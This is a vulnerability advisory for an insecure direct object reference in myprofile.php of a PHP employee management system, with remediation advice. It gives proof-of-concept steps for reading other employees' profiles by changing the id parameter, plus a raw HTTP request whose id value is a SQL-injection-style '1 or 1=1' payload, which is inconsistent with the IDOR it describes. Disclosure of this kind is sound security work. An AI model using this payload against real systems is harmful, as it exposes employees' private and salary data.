# SourceCodester Employee Management System IDOR myprofile.php

## Vendor Homepage:
[SourceCodester Employee Management System](https://www.sourcecodester.com/php/14432/employee-management-system-using-php.html)

## Impact:
The SourceCodester Employee Management System's `myprofile.php` page is susceptible to an Insecure Direct Object Reference (IDOR) vulnerability. By manipulating the `id` parameter in the URL, an attacker can access other employees' profiles without proper authorization. This could lead to unauthorized disclosure of sensitive information, such as personal details or salary data, posing a significant privacy risk to employees and potentially violating data protection regulations.

## Proof of Concept:
1. Visit `/myprofile.php?id=`.
2. Fill the `id` parameter with any number or increment the current ID.
3. Other employees' information can be viewed.

## Request Example:
```http 
GET /myprofile.php?id=1%20or%201=1 HTTP/1.1
Host: [REDACTED]
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```
### Remediation:
To mitigate this IDOR vulnerability in myprofile.php, access controls should be implemented to ensure that users can only view their own profiles. This can be achieved by validating the user's session or role and verifying that the requested profile corresponds to their own account. Additionally, sensitive information should be encrypted or obscured to limit the potential impact of unauthorized access. Regular security audits and testing should be conducted to identify and address any similar vulnerabilities in the application.

### CWE:
[CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

